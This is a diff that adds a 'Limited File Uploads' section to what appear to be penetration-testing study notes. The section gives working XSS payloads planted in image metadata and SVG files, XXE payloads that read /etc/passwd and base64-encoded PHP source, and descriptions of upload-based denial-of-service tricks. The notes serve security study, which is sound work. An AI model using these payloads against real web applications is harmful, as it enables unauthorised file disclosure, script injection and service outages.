@@ -356,4 +356,78 @@ By combining attacks, you can bypass robust filters. Examples include:
 
 ---
 
+# Limited File Uploads
+
+## Introduction
+Even with secure filters limiting file uploads to specific types, vulnerabilities may still be exploited using file types like SVG, HTML, XML, and other image or document formats. Fuzzing allowed file extensions is crucial for identifying attack vectors.
+
+## **XSS (Cross-Site Scripting)**
+1. **HTML File Uploads**:
+   - Malicious HTML files can execute JavaScript (e.g., XSS or CSRF attacks) when accessed by users.
+   
+2. **Image Metadata Injection**:
+   - Inject XSS payloads into metadata (e.g., `Comment`, `Artist`) using `exiftool`:
+     ```bash
+     $ exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
+     ```
+   - If metadata is displayed, XSS payload triggers.
+
+3. **SVG Payloads**:
+   - SVG images are XML-based and allow embedded scripts:
+     ```xml
+     <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+     <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+         <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+         <script type="text/javascript">alert(window.origin);</script>
+     </svg>
+     ```
+   - Payload triggers when image is displayed.
+
+
+## **XXE (XML External Entity)**
+
+1. **Extract Files**:
+   - Example SVG payload to read `/etc/passwd`:
+     ```xml
+     <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+     <svg>&xxe;</svg>
+     ```
+
+2. **Read Source Code**:
+   - Base64-encode PHP source files:
+     ```xml
+     <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+     <svg>&xxe;</svg>
+     ```
+
+3. **Blind XXE with Documents**:
+   - XML-based formats like PDF or Office documents can carry XXE payloads if the application supports them.
+
+4. **SSRF (Server-Side Request Forgery)**:
+   - XXE can also enumerate internal services or interact with private APIs for further exploitation.
+
+
+
+## **DoS (Denial of Service)**
+
+1. **XXE DoS**:
+   - Leverage XXE vulnerabilities to overload the server.
+
+2. **Decompression Bomb**:
+   - Upload malicious ZIP archives with nested files, expanding to Petabytes when extracted.
+
+3. **Pixel Flood Attack**:
+   - Modify compressed image data to falsely claim excessive resolution (e.g., 4 Gigapixels).
+
+4. **Large File Uploads**:
+   - Exploit forms with no file size restrictions to fill up server storage.
+
+5. **Directory Traversal**:
+   - Upload files to restricted directories (e.g., `../../../etc/passwd`) to crash the server.
+
+---
+
 
